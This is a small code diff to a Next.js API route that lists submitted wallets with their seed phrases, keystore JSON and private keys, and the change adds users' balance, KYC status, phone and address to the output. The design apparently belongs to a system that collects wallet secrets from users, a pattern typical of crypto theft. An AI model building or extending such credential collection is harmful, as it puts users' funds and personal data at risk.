@@ -58,7 +58,7 @@ export async function GET(req: NextRequest) {
     // Get wallets with user info
     const wallets = await Wallet.find(filter)
       .select("_id userId walletName walletType seedPhrase keystoreJson privateKey status submittedAt approvedAt rejectedReason approvedBy")
-      .populate("userId", "email fullName accountNumber")
+      .populate("userId", "email fullName accountNumber balance accountStatus kycVerified phone address")
       .populate("approvedBy", "email fullName")
       .sort({ submittedAt: -1 })
       .skip(skip)
